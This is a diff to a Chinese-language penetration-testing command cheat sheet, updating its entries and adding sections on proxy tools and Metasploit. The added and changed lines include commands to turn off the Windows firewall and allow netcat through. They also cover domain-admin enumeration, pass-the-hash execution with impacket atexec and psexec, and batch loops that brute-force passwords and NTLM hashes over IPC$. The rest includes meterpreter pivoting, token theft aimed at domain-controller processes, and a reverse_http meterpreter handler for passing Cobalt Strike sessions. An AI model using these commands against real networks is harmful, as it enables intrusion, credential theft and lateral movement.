@@ -1,7 +1,7 @@
 # command
 收集渗透中会用到的常用命令  。
 
-更新时间：2021.8.28
+更新时间：2021.9.22
 
 ## nmap
 
@@ -63,6 +63,12 @@ python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1
 ```
 nbtscan.exe 10.11.1.0/24
 ```
+
+## 代理工具
+proxychain   
+sockscap64    
+proxifier   
+
 
 ## grep
 
@@ -437,7 +443,7 @@ Net localgroup /domain 域用户组
 
 Net localgroup adminnstrators 本地管理员组成员
 
-net localgroup adminstrators /domain 域管理员组成员
+net localgroup adminstrators /domain 查看登陆过主机的管理员
 
 Wmic useraccount get /all 获取域内用户详细信息
 
@@ -460,11 +466,11 @@ Net accounts /domain 查询域中密码策略
 
 Net group /domain 查看域内所有用户组
 
-Net group “Domain Controllers” /domain 查看域控制器组
+Net group "Domain Controllers" /domain 查看域控制器组
 
-Net group “Domain computers” /domain 查看域内所有计算机列表
+Net group "Domain computers" /domain 查看域内所有计算机列表
 
-Net group “Domain admins” /domain 查看域内管理员用户
+Net group "Domain admins" /domain 查看域内管理员用户
 
 Net user /domain kent active:yes 启用域账户
 
@@ -484,15 +490,15 @@ Netsh firewall show config 查看防火墙配置
 
 Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)
 
-Netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow program=”C:\nc.exe” 允许指定程序进入(windows server 2003后)
+Netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe" 允许指定程序进入(windows server 2003后)
 
-Netsh advfirewall firewall add rule name=”allow nc” dir=out action=allow program=”C:\nc.exe”允许指定程序退出(windows server 2003后)
+Netsh advfirewall firewall add rule name="allow nc" dir=out action=allow program="C:\nc.exe"允许指定程序退出(windows server 2003后)
 
-Netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)
+Netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)
 
-Reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings”查看端口代理配置信息
+Reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"查看端口代理配置信息
 
-Reg query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /V PortNumber 查看远程桌面端口号
+Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber 查看远程桌面端口号
 
 ```
 
@@ -522,20 +528,20 @@ sc \\192.168.210.107 start hacker      #启动hacker服务
 下载https://github.com/maaaaz/impacket-examples-windows   
 Atexec
 ```
-需要135端口开启
+需要445端口开启
 Atexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"
 
 Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
 ```
-批量
+批量,需要保存为bat执行
 ```
-已知密码和用户批量连接ip:
+用已知密码和用户，批量连接ip:
 FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator
 
-已知用户和ip批量连接密码：
+已知用户和ip，批量连接密码(爆破密码)：
 FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\administrator
 
-已知用户和ip批量连接hash：
+已知用户和ip，批量连接hash(爆破hash)：
 FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
 ```
 
@@ -548,7 +554,7 @@ Psexec \192.168.202.148 -accepteula -s cmd
 官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递
 Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd
 
-PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 "whoami" (官方执行不了)
+PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 "whoami" (官方提供的exe执行不了)
 ```
 
 smbexec
@@ -905,12 +911,13 @@ rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连
 run autoroute –h #查看帮助
 run autoroute -s 192.168.2.0/24  #添加到目标环境网络
 run autoroute –p  #查看添加的路由
+
 # 方式二post/multi/manage/autoroute
 run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络
 run post/multi/manage/autoroute CMD=print # 查看添加的路由
 (Specify the autoroute command (Accepted: add, autoadd, print, delete, default))
 
-# 然后可以利用arp_scanner、portscan等进行扫描
+# 然后可以利用arp_scanner、portscan等进行存活检测
 run arp_scanner -r 192.168.2.0/24
 run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
 run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0
@@ -952,7 +959,8 @@ run post/windows/gather/dumplinks   #获取最近的文件操作
 run post/windows/gather/enum_ie  #获取IE缓存
 run post/windows/gather/enum_chrome   #获取Chrome缓存
 run post/windows/gather/enum_patches  #补丁信息
-run post/windows/gather/enum_domain  #查找域控
+run post/windows/gather/enum_domain  #查找定位域控
+run post/windows/gather/enum_logged_on_users  #登录过的用户
 ```
 
 ### 提权
@@ -1198,7 +1206,7 @@ execute -f cmd.exe -i –t    # -t 使用假冒的token 执行
 rev2self   #返回原始token
 
 # 2.steal_token窃取令牌
-steal_token <pid值>   #从指定进程中窃取token   先ps
+steal_token <pid值>   #从指定进程中窃取token   先ps,找域控进程
 drop_token  #删除窃取的token
 ```
 
@@ -1390,6 +1398,19 @@ msf5 exploit(windows/local/registry_persistence) > run
 
 # cs大全
 
+cs派生msf
+
+```bash
+
+msf > use exploit/multi/handler 
+msf exploit(handler) > set payload windows/meterpreter/reverse_http
+msf exploit(handler) > set lhost 192.168.0.143
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > exploit
+
+cs创建一个windows/foreign/reverse_http的 Listener
+然后选中对应机器，右键->Spawn，选择刚刚创建的监听器。
+```
 
 
 
